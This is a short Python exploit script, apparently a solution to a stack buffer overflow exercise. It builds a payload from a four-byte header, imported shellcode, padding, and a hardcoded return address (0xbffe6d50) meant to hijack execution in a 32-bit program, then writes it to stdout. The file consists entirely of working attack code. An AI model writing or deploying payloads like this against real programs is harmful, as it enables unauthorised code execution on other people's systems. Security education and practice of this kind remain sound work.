import sys
from shellcode import shellcode

a = b'\x00'+b'\x01'+b'\x00'+b'\x80'
b = b'\x45' * (1068-len(shellcode)) + b'\x50'+b'\x6d'+ b'\xfe'+ b'\xbf'

sys.stdout.buffer.write(a+shellcode+b)
